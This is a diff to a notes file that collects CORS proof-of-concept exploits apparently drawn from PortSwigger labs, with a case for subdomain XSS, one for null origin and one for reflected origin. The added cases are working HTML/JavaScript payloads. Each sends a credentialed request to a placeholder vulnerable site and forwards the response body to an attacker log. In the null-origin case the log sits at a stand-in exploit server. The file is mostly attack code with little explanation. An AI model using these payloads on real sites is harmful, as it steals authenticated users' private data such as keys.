@@ -1,6 +1,6 @@
 Below are some of the PoC for CORS extracted from Portswigger.
 
-Case 1: CORS through Sub-domain (Needed to have XSS in one of the subdomains)
+### Case 1: CORS through Sub-domain (Needed to have XSS in one of the subdomains) ###
 
 <html>
     <body>
@@ -11,3 +11,39 @@ Case 1: CORS through Sub-domain (Needed to have XSS in one of the subdomains)
     </body>
 </html>
 
+### Case 2: Null Origin ###
+
+<html>
+<body>
+<h2>CORS with null origin</h2>
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://vulnerable_webiste/endpoint',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='https://exploit_server/logs?keys='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
+</body>
+</html>
+
+### Case 3: CORS with the reflected origin ###
+
+<html>
+<body>
+<h2>CORS with reflected origin</h2>
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://vulnerable_webiste/endpoint',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/logs?keys='+this.responseText;
+    };
+</script>
+</body>
+</html>
